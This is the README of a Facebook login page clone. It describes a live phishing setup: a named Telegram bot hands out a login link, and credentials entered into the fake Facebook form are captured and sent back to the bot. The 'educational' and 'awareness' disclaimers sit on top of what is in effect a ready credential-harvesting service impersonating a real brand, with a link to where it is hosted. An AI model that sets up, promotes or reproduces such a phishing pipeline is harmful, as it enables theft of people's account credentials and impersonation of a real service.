# Facebook Login Clone (Open Source UI Replica)

## 📘 Overview

**NB: This project is an open-source clone of the Facebook login page, created strictly for educational and cybersecurity awareness purposes.**

> ⚠️ This demo mimics how phishing interfaces can look and function. It should only be used in ethical hacking training, CTFs, or secure educational labs.  
> ❗️**Do not enter real credentials.** This demo sends form data to a Telegram bot for simulated phishing awareness only.

### 🎯 How It Works

- Open the Telegram bot: [Bankai Senbonzakura Bot](https://t.me/Bankai_Senbonzakura_bot)
- Type `/start`
- After a short delay (due to hosting on Render), you'll receive a **login link**
- Any credentials entered in the form are captured and sent back to the Telegram bot (for demonstration)
